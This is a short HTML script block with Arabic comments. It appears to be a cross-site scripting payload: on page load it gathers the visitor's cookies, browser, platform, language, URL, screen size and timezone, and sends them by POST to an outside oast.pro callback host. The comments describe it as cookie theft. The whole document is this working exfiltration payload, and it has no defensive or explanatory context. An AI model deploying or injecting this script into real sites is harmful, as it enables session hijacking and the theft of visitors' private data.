<script>
  // بمجرد تحميل الصفحة، سرقة الكوكيز وإرسالها إلى OAST
  window.onload = function () {
    const data = {
      cookies: document.cookie,  // سرقة الكوكيز
      userAgent: navigator.userAgent, // معلومات المتصفح
      platform: navigator.platform, // النظام
      language: navigator.language, // لغة المتصفح
      url: location.href, // عنوان الصفحة
      screen: `${screen.width}x${screen.height}`, // دقة الشاشة
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone // المنطقة الزمنية
    };

    // إرسال البيانات عبر POST إلى Webhook الخاص بـ OAST
    fetch("https://d1xgcz3z1wg0000d1bcggo6agxhyyyyyb.oast.pro", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    }).then(response => {
      console.log("Data sent to OAST Webhook successfully.");
    }).catch(err => {
      console.log("Error sending data:", err);
    });
  };
</script>
